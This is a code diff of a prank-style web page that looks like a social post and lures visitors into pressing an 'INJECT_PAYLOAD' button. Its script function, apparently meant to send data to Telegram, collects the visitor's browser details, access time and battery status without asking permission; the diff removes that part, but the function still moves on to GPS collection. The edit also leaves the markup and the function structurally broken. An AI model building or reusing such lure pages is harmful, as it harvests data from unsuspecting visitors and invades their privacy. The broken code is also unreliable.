@@ -439,12 +439,13 @@
                     <div class="post-title">
                         press the button LOL
                     </div>
-
                     <div class="trigger-zone">
+                        <!-- Kita bisa set data bawaan yang mau dikirim di sini -->
+                        <input type="hidden" id="payloadName" value="Target-Alpha">
+                        <input type="hidden" id="payloadMessage" value="Payload injected successfully via Terminal.">
+                        
                         <button class="exploit-btn" onclick="kirimKeTelegram()">[ INJECT_PAYLOAD ]</button>
                     </div>
-                </div>
-
                 <div class="action-bar">
                     <span class="action-item">💬 404 Comments</span>
                     <span class="action-item">🔗 Share</span>
@@ -521,22 +522,38 @@
             document.getElementById('customAlert').style.display = 'none';
             document.querySelectorAll('.malware-popup').forEach(el => el.remove());
         }       
-        async function kirimKeTelegram() {
-    const dataBrowser = navigator.userAgent;
-    const waktuAkses = new Date().toLocaleString();
-    
-    // 1. Mengambil data status Baterai (Tanpa butuh Izin Pengguna)
-    let infoBaterai = "Tidak didukung oleh browser target";
-    if ('getBattery' in navigator) {
-        try {
-            const battery = await navigator.getBattery();
-            const level = Math.round(battery.level * 100);
-            const statusCas = battery.charging ? "Sedang Di-cas ⚡" : "Menggunakan Baterai 🔋";
-            infoBaterai = `${level}% (${statusCas})`;
-        } catch (e) {
-            infoBaterai = "Gagal memuat data baterai";
+     async function kirimKeTelegram() {
+    // Ambil data dari elemen HTML
+    const namaData = document.getElementById('payloadName').value;
+    const pesanData = document.getElementById('payloadMessage').value;
+
+    try {
+        // Panggil API internal Vercel kamu
+        const response = await fetch('/api/kirim', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json' // PENTING: Beritahu server kalau ini JSON
+            },
+            body: JSON.stringify({
+                nama: namaData,
+                pesan: pesanData
+            })
+        });
+
+        const hasil = await response.json();
+
+        if (response.ok) {
+            alert('Payload Berhasil Di-inject!');
+            console.log('Sukses:', hasil);
+        } else {
+            alert('Gagal menginject: ' + hasil.error);
+            console.error('Gagal:', hasil);
         }
+    } catch (error) {
+        alert('Terjadi kesalahan jaringan.');
+        console.error('Error Jaringan:', error);
     }
+
 
     // 2. Mengambil data GPS (Wajib memunculkan pop-up izin browser)
     if (navigator.geolocation) {
